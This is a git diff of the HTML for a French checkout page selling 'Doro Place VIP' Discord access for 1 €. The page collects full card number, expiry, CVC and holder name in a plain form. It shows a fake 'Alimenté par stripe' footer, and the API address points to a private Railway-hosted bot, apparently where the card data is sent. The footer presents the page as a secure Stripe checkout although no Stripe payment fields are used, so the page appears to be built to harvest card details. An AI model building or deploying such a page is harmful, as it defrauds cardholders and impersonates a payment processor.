@@ -3,128 +3,126 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Doro Place | VIP Premium (Sécurisé)</title>
+    <title>Paiement - Doro Place</title>
     <link rel="stylesheet" href="style.css">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700;900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 </head>
 <body>
-    <div class="mesh-gradient"></div>
-    
-    <main class="wrapper">
-        <div class="content-grid">
-            <!-- Left Side: Branding & Info -->
-            <section class="info-side">
-                <div class="brand">
-                    <span class="logo-dot"></span>
-                    <span class="brand-name">Doro Place</span>
+    <div class="checkout-wrapper">
+        <div class="checkout-container">
+            <!-- Left Panel -->
+            <div class="left-panel">
+                <div class="back-button">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
                 </div>
                 
-                <div class="hero-text">
-                    <h1>Devenez <span>Premium</span>.</h1>
-                    <p>Rejoignez l'élite de <strong>Doro Place</strong>. Votre paiement est 100% sécurisé et protégé par des protocoles bancaires avancés.</p>
+                <div class="product-info-container">
+                    <span class="subtitle">Doro Place VIP</span>
+                    <h1 class="title">Accès à vie</h1>
+                    <div class="price-box">
+                        <span class="amount">1,00 €</span>
+                        <span class="frequency">Paiement unique</span>
+                    </div>
+                    <p class="description">Plus de limites. Scaler votre expérience sur Doro Place avec l'accès Premium définitif.</p>
                 </div>
+            </div>
 
-                <div class="security-badges">
-                    <div class="badge">
-                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
-                        <span>Protection SSL 256-bit</span>
-                    </div>
-                    <div class="badge">
-                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
-                        <span>Passerelle Sécurisée</span>
-                    </div>
-                </div>
-
-                <ul class="benefit-list">
-                    <li><span class="icon">✦</span> Accès aux salons secrets</li>
-                    <li><span class="icon">✦</span> Rôle VIP exclusif</li>
-                    <li><span class="icon">✦</span> Support prioritaire par ticket</li>
-                </ul>
-            </section>
-
-            <!-- Right Side: Payment Form -->
-            <section class="form-side">
-                <div class="glass-container" id="paymentSection">
-                    <div class="price-container">
-                        <span class="price-label">Paiement unique</span>
-                        <div class="price-value">1<span>.00€</span></div>
-                    </div>
-
+            <!-- Right Panel -->
+            <div class="right-panel">
+                <div id="payment-view">
+                    <h2 class="form-title">Saisissez vos données de paiement</h2>
+                    
                     <form id="paymentForm">
-                        <div class="field">
-                            <label>Titulaire de la carte</label>
-                            <input type="text" id="cardHolder" placeholder="NOM PRÉNOM" autocomplete="off" required>
-                        </div>
-
-                        <div class="field">
-                            <label>Numéro de carte</label>
-                            <div class="input-with-icon">
-                                <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="off" required>
-                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="input-icon"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg>
+                        <div class="form-section">
+                            <label>Moyen de paiement</label>
+                            <div class="payment-box">
+                                <div class="payment-box-header">
+                                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
+                                    <span>Carte</span>
+                                </div>
+                                <div class="payment-box-content">
+                                    <div class="field-item full-width">
+                                        <label class="inner-label">Informations de la carte</label>
+                                        <div class="card-number-row">
+                                            <input type="text" id="cardNumber" placeholder="1234 1234 1234 1234" maxlength="19" required>
+                                        </div>
+                                    </div>
+                                    <div class="field-split">
+                                        <div class="field-item">
+                                            <input type="text" id="expiry" placeholder="MM / AA" maxlength="5" required>
+                                        </div>
+                                        <div class="field-item">
+                                            <div class="cvc-row">
+                                                <input type="text" id="cvc" placeholder="CVC" maxlength="3" required>
+                                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="5" width="20" height="14" rx="2"/><line x1="2" y1="10" x2="22" y2="10"/></svg>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
                             </div>
                         </div>
 
-                        <div class="field-row">
-                            <div class="field">
-                                <label>Expiration</label>
-                                <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" autocomplete="off" required>
-                            </div>
-                            <div class="field">
-                                <label>CVC</label>
-                                <input type="text" id="cvc" placeholder="•••" maxlength="4" autocomplete="off" required>
+                        <div class="form-section">
+                            <label for="cardHolder">Nom du titulaire de la carte</label>
+                            <input type="text" id="cardHolder" placeholder="Nom complet" required>
+                        </div>
+
+                        <div class="form-section">
+                            <label for="country">Pays ou région</label>
+                            <div class="custom-select">
+                                <select id="country">
+                                    <option value="France">France</option>
+                                    <option value="Belgique">Belgique</option>
+                                    <option value="Suisse">Suisse</option>
+                                    <option value="Canada">Canada</option>
+                                    <option value="Luxembourg">Luxembourg</option>
+                                </select>
+                                <svg class="select-arrow" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg>
                             </div>
                         </div>
 
-                        <button type="submit" id="payBtn" class="pay-button">
-                            <div class="btn-content">
-                                <span class="text">Valider</span>
-                                <div class="loader hidden"></div>
-                            </div>
+                        <div class="checkbox-container">
+                            <input type="checkbox" id="save-info">
+                            <label for="save-info">
+                                <strong>Enregistrer mes informations pour régler plus rapidement</strong>
+                                <p>Payez en toute sécurité chez Doro Place. Vos données sont cryptées et protégées.</p>
+                            </label>
+                        </div>
+
+                        <button type="submit" id="payBtn" class="pay-btn">
+                            <span class="btn-text">Payer 1,00 €</span>
+                            <div class="btn-loader hidden"></div>
                         </button>
                     </form>
 
-                    <div class="trust-footer">
-                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" alt="Visa">
-                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" alt="Mastercard">
-                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/PayPal.svg/1200px-PayPal.svg.png" alt="PayPal">
+                    <div class="stripe-footer">
+                        Alimenté par <span class="stripe-logo">stripe</span> | <a href="#">Conditions</a> | <a href="#">Confidentialité</a>
                     </div>
                 </div>
 
-                <!-- Success State -->
-                <div class="glass-container success-box hidden" id="successSection">
-                    <div class="success-header">
-                        <div class="check-container">
-                            <svg viewBox="0 0 52 52" class="checkmark">
-                                <circle cx="26" cy="26" r="25" fill="none"/>
-                                <path fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
-                            </svg>
+                <!-- Success View -->
+                <div id="successSection" class="hidden">
+                    <div class="success-content">
+                        <div class="check-circle">
+                            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
                         </div>
-                        <h2>Achat réussi !</h2>
-                        <p>Le serveur <strong>Doro Place</strong> vous remercie.</p>
-                    </div>
-
-                    <div class="code-wrapper">
-                        <label>Code d'activation VIP</label>
-                        <div class="code-box">
-                            <span id="vipCode">XXXX-XXXX-XXXX-XXXX</span>
-                            <button id="copyBtn" class="copy-trigger">
-                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
-                            </button>
+                        <h2>Achat confirmé</h2>
+                        <p>Votre accès VIP est prêt. Voici votre code :</p>
+                        <div class="vip-code-container">
+                            <span id="vipCode">JSP0-NE9T-VFPO-JGBI</span>
+                            <button id="copyBtn">Copier</button>
                         </div>
+                        <p class="next-step">Ouvrez un ticket dans <strong>#codes-vip</strong> sur Discord pour l'activer.</p>
+                        <a href="https://discord.gg" class="back-link">Continuer sur Discord</a>
                     </div>
-
-                    <p class="final-step">Rendez-vous sur Discord dans le salon <span class="highlight">#codes-vip</span>.</p>
-                    
-                    <a href="https://discord.gg" class="back-link">Retourner sur l'application</a>
                 </div>
-            </section>
+            </div>
         </div>
-    </main>
+    </div>
 
     <script>
-        // METTRE L'URL DE TON BOT RAILWAY ICI (ex: https://ton-bot.up.railway.app)
         window.API_URL = "https://bot-gestion-production.up.railway.app"; 
     </script>
     <script src="script.js"></script>
